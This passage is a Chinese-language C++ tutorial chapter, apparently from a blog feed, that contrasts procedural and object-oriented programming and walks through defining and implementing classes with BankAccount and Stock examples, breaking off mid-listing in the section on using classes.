        <content type="html"><![CDATA[<h2 id="10-1-过程性编程和面向对象编程"><a href="#10-1-过程性编程和面向对象编程" class="headerlink" title="10.1 过程性编程和面向对象编程"></a>10.1 过程性编程和面向对象编程</h2><p>在深入学习C++的类之前，了解两种主要的编程范式（Programming Paradigms）——过程性编程和面向对象编程——之间的区别是很有帮助的。C++ 语言同时支持这两种范式，但其强大的面向对象特性是其核心优势之一。</p><h3 id="过程性编程-Procedural-Programming"><a href="#过程性编程-Procedural-Programming" class="headerlink" title="过程性编程 (Procedural Programming)"></a>过程性编程 (Procedural Programming)</h3><p>过程性编程是最早期的编程范式之一，像C语言就是典型的过程性语言。它的核心思想是将程序看作是一系列要执行的<strong>过程</strong>或<strong>函数</strong>。</p><ul><li>  <strong>关注点：</strong> 主要关注点在于<strong>算法</strong>和<strong>执行步骤</strong>。程序被分解为一系列的函数调用。</li><li>  <strong>数据处理：</strong> 数据通常是独立于函数存在的（例如全局变量），或者作为参数在函数之间传递。数据和操作数据的函数是分离的。</li><li>  <strong>组织方式：</strong> 程序通过函数的层次结构来组织。一个主函数调用其他函数，这些函数又可能调用更底层的函数。</li><li>  <strong>示例语言：</strong> C, Pascal, Fortran。</li></ul><p><strong>过程性编程的思维方式：</strong> “程序需要执行哪些步骤？需要哪些函数来实现这些步骤？”</p><p><strong>例子（概念性）：</strong><br>假设要管理一个银行账户。在过程性方法中，你可能会有：</p><ul><li>  一个数据结构（比如 <code>struct</code>）来存储账户信息（账号、余额）。</li><li>  一系列函数来操作这个数据结构：<code>deposit(account, amount)</code>, <code>withdraw(account, amount)</code>, <code>check_balance(account)</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C 语言示例 (过程性)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BankAccount</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> accountNumber;</span><br><span class="line">    <span class="keyword">double</span> balance;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deposit</span><span class="params">(struct BankAccount* acc, <span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        acc-&gt;balance += amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">withdraw</span><span class="params">(struct BankAccount* acc, <span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amount &gt; <span class="number">0</span> &amp;&amp; acc-&gt;balance &gt;= amount) &#123;</span><br><span class="line">        acc-&gt;balance -= amount;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理错误</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> check_balance(struct BankAccount* acc) &#123;</span><br><span class="line">    <span class="keyword">return</span> acc-&gt;balance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BankAccount</span> <span class="title">myAccount</span> =</span> &#123;<span class="number">12345</span>, <span class="number">1000.0</span>&#125;;</span><br><span class="line">    deposit(&amp;myAccount, <span class="number">500.0</span>);</span><br><span class="line">    withdraw(&amp;myAccount, <span class="number">200.0</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种模式下，数据（<code>myAccount</code>）和操作（<code>deposit</code>, <code>withdraw</code>）是分开定义的。</p><h3 id="面向对象编程-Object-Oriented-Programming-OOP"><a href="#面向对象编程-Object-Oriented-Programming-OOP" class="headerlink" title="面向对象编程 (Object-Oriented Programming - OOP)"></a>面向对象编程 (Object-Oriented Programming - OOP)</h3><p>面向对象编程（OOP）是一种不同的思考方式。它将程序看作是由相互交互的<strong>对象 (Objects)</strong> 组成的。</p><ul><li>  <strong>关注点：</strong> 主要关注点在于<strong>数据</strong>以及与数据相关的<strong>操作</strong>。程序的核心是对象。</li><li>  <strong>对象：</strong> 对象是现实世界实体的抽象，它<strong>封装 (Encapsulates)</strong> 了<strong>数据（属性/状态）</strong>和可以对这些数据执行的<strong>操作（方法/行为）</strong>。</li><li>  <strong>组织方式：</strong> 程序通过创建对象并让这些对象相互发送消息（调用方法）来组织。</li><li><strong>核心概念：</strong><ul><li>  <strong>封装 (Encapsulation):</strong> 将数据和操作数据的函数捆绑在一起（形成类），并对外部隐藏对象的内部实现细节（数据隐藏）。</li><li>  <strong>继承 (Inheritance):</strong> 允许创建一个新类（派生类），该类继承现有类（基类）的属性和方法，从而实现代码重用和层次结构。</li><li>  <strong>多态 (Polymorphism):</strong> 允许不同类的对象对相同的消息（方法调用）做出不同的响应。这通常通过虚函数实现。</li><li>  <strong>抽象 (Abstraction):</strong> 关注对象的本质特征，忽略不重要的细节。类就是一种抽象。</li></ul></li><li>  <strong>示例语言：</strong> C++, Java, C#, Python, Smalltalk。</li></ul><p><strong>面向对象编程的思维方式：</strong> “程序涉及哪些‘事物’（对象）？每个‘事物’有哪些特征（数据）？它可以做什么（方法）？这些‘事物’之间如何交互？”</p><p><strong>例子（概念性）：</strong><br>对于银行账户，OOP方法会创建一个 <code>BankAccount</code> <strong>类</strong>：</p><ul><li>  <strong>数据成员（属性）：</strong> <code>accountNumber</code>, <code>balance</code> (通常设为私有 <code>private</code>，以实现数据隐藏)。</li><li>  <strong>成员函数（方法）：</strong> <code>deposit(amount)</code>, <code>withdraw(amount)</code>, <code>check_balance()</code> (这些函数直接操作对象内部的数据)。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ 示例 (面向对象)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BankAccount</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>: <span class="comment">// 数据隐藏</span></span><br><span class="line">    <span class="keyword">int</span> accountNumber;</span><br><span class="line">    <span class="keyword">double</span> balance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>: <span class="comment">// 公共接口</span></span><br><span class="line">    <span class="comment">// 构造函数 (用于创建对象)</span></span><br><span class="line">    BankAccount(<span class="keyword">int</span> accNum, <span class="keyword">double</span> initialBalance) &#123;</span><br><span class="line">        accountNumber = accNum;</span><br><span class="line">        balance = (initialBalance &gt;= <span class="number">0</span>) ? initialBalance : <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deposit</span><span class="params">(<span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            balance += amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">withdraw</span><span class="params">(<span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span> &amp;&amp; balance &gt;= amount) &#123;</span><br><span class="line">            balance -= amount;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 处理错误</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> check_balance() <span class="keyword">const</span> &#123; <span class="comment">// const 表示此方法不修改对象状态</span></span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getAccountNumber</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> accountNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;; <span class="comment">// 注意类定义末尾的分号</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 BankAccount 对象</span></span><br><span class="line">    <span class="function">BankAccount <span class="title">myAccount</span><span class="params">(<span class="number">12345</span>, <span class="number">1000.0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过对象调用方法</span></span><br><span class="line">    myAccount.deposit(<span class="number">500.0</span>);</span><br><span class="line">    myAccount.withdraw(<span class="number">200.0</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Balance: &quot;</span> &lt;&lt; myAccount.check_balance() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，数据 (<code>accountNumber</code>, <code>balance</code>) 和操作 (<code>deposit</code>, <code>withdraw</code>, <code>check_balance</code>) 被紧密地捆绑在 <code>BankAccount</code> 类中。你通过 <code>myAccount</code> 这个对象来调用它的方法。</p><h3 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h3><table><thead><tr><th align="left">特性</th><th align="left">过程性编程</th><th align="left">面向对象编程 (OOP)</th></tr></thead><tbody><tr><td align="left"><strong>核心</strong></td><td align="left">函数/过程</td><td align="left">对象 (数据 + 方法)</td></tr><tr><td align="left"><strong>数据</strong></td><td align="left">通常与函数分离</td><td align="left">封装在对象内部</td></tr><tr><td align="left"><strong>访问控制</strong></td><td align="left">有限 (主要靠作用域)</td><td align="left">强 (public, private, protected)</td></tr><tr><td align="left"><strong>主要优势</strong></td><td align="left">简单直接，适合小型或中型项目</td><td align="left">模块化、重用性、可维护性、扩展性好</td></tr><tr><td align="left"><strong>设计方法</strong></td><td align="left">自顶向下 (Top-down)</td><td align="left">自底向上 (Bottom-up) 或混合</td></tr><tr><td align="left"><strong>代码重用</strong></td><td align="left">主要通过函数库</td><td align="left">主要通过继承和组合</td></tr><tr><td align="left"><strong>适合场景</strong></td><td align="left">算法密集型、顺序执行任务</td><td align="left">大型复杂系统、模拟、GUI</td></tr></tbody></table><p>C++ 最初是从 C 语言发展而来的，因此它完全兼容过程性编程。然而，C++ 的真正威力在于其强大的面向对象特性，它允许开发者构建更大型、更复杂、更易于维护和扩展的软件系统。接下来的章节将深入探讨 OOP 的核心——类和对象。</p><h2 id="10-2-抽象和类"><a href="#10-2-抽象和类" class="headerlink" title="10.2 抽象和类"></a>10.2 抽象和类</h2><p>面向对象编程（OOP）的核心思想之一是**抽象 (Abstraction)**。在编程中，抽象意味着关注事物的本质特征和行为，而忽略其不重要的内部细节。我们每天都在使用抽象：当你开车时，你只需要知道如何使用方向盘、油门和刹车（接口），而不需要了解引擎内部复杂的机械原理（实现细节）。</p><h3 id="10-2-1-类型是什么"><a href="#10-2-1-类型是什么" class="headerlink" title="10.2.1 类型是什么"></a>10.2.1 类型是什么</h3><p>在编程语言中，“类型”（Type）定义了一组可能的值以及可以对这些值执行的操作。</p><ul><li>  <strong>内置类型 (Built-in Types):</strong> C++ 提供了像 <code>int</code>, <code>float</code>, <code>char</code>, <code>bool</code> 这样的基本类型。我们知道 <code>int</code> 可以存储整数，并且可以对它们执行加、减、乘、除等运算。编译器知道如何表示这些类型的数据以及如何执行这些操作。</li><li>  <strong>用户定义类型 (User-Defined Types - UDT):</strong> C++ 允许程序员创建自己的类型来模拟现实世界或特定问题域中的概念。这就是<strong>类 (Class)</strong> 发挥作用的地方。类是一种将数据（属性）和操作这些数据的函数（方法）捆绑在一起的机制，从而创建新的数据类型。</li></ul><p>例如，如果你在编写一个股票交易程序，你可能需要一个表示“股票”的类型。这个类型应该包含哪些数据（如股票名称、持有数量、单价）？可以对它执行哪些操作（如购买、出售、更新价格、显示信息）？类允许你精确地定义这些。</p><h3 id="10-2-2-C-中的类"><a href="#10-2-2-C-中的类" class="headerlink" title="10.2.2 C++中的类"></a>10.2.2 C++中的类</h3><p>类是创建对象的蓝图或模板。它定义了：</p><ol><li> <strong>数据成员 (Data Members):</strong> 对象将存储的数据（也称为属性、状态）。</li><li> <strong>成员函数 (Member Functions):</strong> 可以对对象的数据执行的操作（也称为方法、行为）。</li></ol><p><strong>类声明的基本语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 私有数据成员和成员函数</span></span><br><span class="line">    <span class="comment">// 通常将数据成员放在这里，实现数据隐藏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 公有数据成员和成员函数</span></span><br><span class="line">    <span class="comment">// 这是类的公共接口，外部代码通过它们与对象交互</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="comment">// 保护成员 (将在继承中讨论)</span></span><br><span class="line">&#125;; <span class="comment">// 注意末尾的分号</span></span><br></pre></td></tr></table></figure><ul><li>  <strong><code>class</code> 关键字:</strong> 表明你正在定义一个类。</li><li>  <strong><code>ClassName</code>:</strong> 你为新类型指定的名称（遵循变量命名规则，通常首字母大写）。</li><li><strong>访问说明符 (Access Specifiers):</strong><ul><li>  <code>private</code>: 私有成员只能被<strong>类的内部成员函数</strong>访问。这是实现<strong>数据隐藏 (Data Hiding)</strong> 的关键，保护数据不被外部代码随意修改，是封装的重要体现。默认情况下，类成员是 <code>private</code> 的。</li><li>  <code>public</code>: 公有成员可以被程序中的<strong>任何地方</strong>访问（通过类的对象）。它们构成了类的**公共接口 (Public Interface)**。</li><li>  <code>protected</code>: 与继承相关，现在可以暂时将其视为与 <code>private</code> 类似。</li></ul></li><li>  <strong>成员:</strong> 类定义的花括号 <code>&#123;&#125;</code> 内部声明的变量（数据成员）和函数（成员函数）。</li></ul><p><strong>示例：定义一个简单的 <code>Stock</code> 类</strong></p><p>假设我们要创建一个表示股票持有的类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通常放在头文件 (e.g., stock.h) 中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 为了使用 std::string</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>: <span class="comment">// 数据成员通常是私有的</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> company;</span><br><span class="line">    <span class="keyword">long</span> shares;</span><br><span class="line">    <span class="keyword">double</span> share_val;</span><br><span class="line">    <span class="keyword">double</span> total_val;</span><br><span class="line">    <span class="comment">// 一个私有辅助函数，只能在类内部调用</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_tot</span><span class="params">()</span> </span>&#123; total_val = shares * share_val; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>: <span class="comment">// 成员函数通常是公有的，构成接口</span></span><br><span class="line">    <span class="comment">// 函数原型 (声明)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">acquire</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr)</span></span>; <span class="comment">// 买入股票</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;                      <span class="comment">// 增持股票</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;                     <span class="comment">// 卖出股票</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">double</span> price)</span></span>;                             <span class="comment">// 更新股价</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 显示股票信息 (const表明此函数不修改对象)</span></span><br><span class="line">&#125;; <span class="comment">// 类定义结束</span></span><br></pre></td></tr></table></figure><p>这个 <code>Stock</code> 类定义了一个新的数据类型。它封装了股票相关的数据 (<code>company</code>, <code>shares</code>, <code>share_val</code>, <code>total_val</code>) 和操作这些数据的函数 (<code>acquire</code>, <code>buy</code>, <code>sell</code>, <code>update</code>, <code>show</code>)。数据成员被设为 <code>private</code>，外部代码不能直接访问它们，只能通过 <code>public</code> 的成员函数来交互。<code>set_tot()</code> 是一个内部辅助函数，也被设为 <code>private</code>。</p><h3 id="10-2-3-实现类成员函数"><a href="#10-2-3-实现类成员函数" class="headerlink" title="10.2.3 实现类成员函数"></a>10.2.3 实现类成员函数</h3><p>类定义通常只包含成员函数的<strong>声明（原型）</strong>。函数的<strong>定义（实现）</strong>可以放在类声明的内部（如果函数很简单，可以作为内联函数），或者更常见地，放在类声明的外部（通常在对应的源文件 <code>.cpp</code> 中）。</p><p>当在类外部定义成员函数时，你需要使用<strong>作用域解析运算符 <code>::</code></strong> 来指明这个函数属于哪个类。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ReturnType <span class="title">ClassName::FunctionName</span><span class="params">(ParameterList)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：实现 <code>Stock</code> 类的成员函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通常放在源文件 (e.g., stock.cpp) 中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// 包含类定义的头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用作用域解析运算符 :: 指明函数属于 Stock 类</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::acquire</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr)</span> </span>&#123;</span><br><span class="line">    company = co;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares can&#x27;t be negative; &quot;</span></span><br><span class="line">                  &lt;&lt; company &lt;&lt; <span class="string">&quot; shares set to 0.\n&quot;</span>;</span><br><span class="line">        shares = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares = n;</span><br><span class="line">    &#125;</span><br><span class="line">    share_val = pr;</span><br><span class="line">    set_tot(); <span class="comment">// 调用私有成员函数计算总值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares purchased can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares += num;</span><br><span class="line">        share_val = price; <span class="comment">// 假设按新价格计算</span></span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares sold can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; shares) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You can&#x27;t sell more than you have! &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares -= num;</span><br><span class="line">        share_val = price; <span class="comment">// 假设按新价格计算</span></span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::update</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    share_val = price;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意 const 关键字在函数定义和声明中都要有</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置输出格式</span></span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags orig =</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::streamsize prec = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Company: &quot;</span> &lt;&lt; company</span><br><span class="line">              &lt;&lt; <span class="string">&quot;  Shares: &quot;</span> &lt;&lt; shares &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Share Price: $&quot;</span> &lt;&lt; share_val;</span><br><span class="line">    <span class="comment">// 设置精度为2位小数显示总价</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Total Worth: $&quot;</span> &lt;&lt; total_val &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复原始格式</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(orig, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(prec);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：私有成员函数 set_tot() 也可以在类外部定义，</span></span><br><span class="line"><span class="comment">// 但因为它很简单，通常会直接在类定义内部实现（如上所示），</span></span><br><span class="line"><span class="comment">// 这样它就可能被编译器视为内联函数。</span></span><br><span class="line"><span class="comment">// 如果在外部定义：</span></span><br><span class="line"><span class="comment">// void Stock::set_tot() &#123;</span></span><br><span class="line"><span class="comment">//     total_val = shares * share_val;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><p><strong><code>const</code> 成员函数:</strong><br>在 <code>show()</code> 函数声明和定义的末尾都有 <code>const</code> 关键字。这表明 <code>show()</code> 是一个<strong>常量成员函数</strong>，它承诺不会修改调用它的对象的数据成员。这是一个好习惯，可以提高代码的可读性和安全性，并允许对 <code>const</code> 对象调用此函数。</p><h3 id="10-2-4-使用类"><a href="#10-2-4-使用类" class="headerlink" title="10.2.4 使用类"></a>10.2.4 使用类</h3><p>一旦定义了类（蓝图），你就可以创建该类的<strong>对象 (Objects)</strong> 或**实例 (Instances)**。创建对象就像声明一个基本类型的变量一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 main() 函数或其他函数中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// 需要包含类定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> 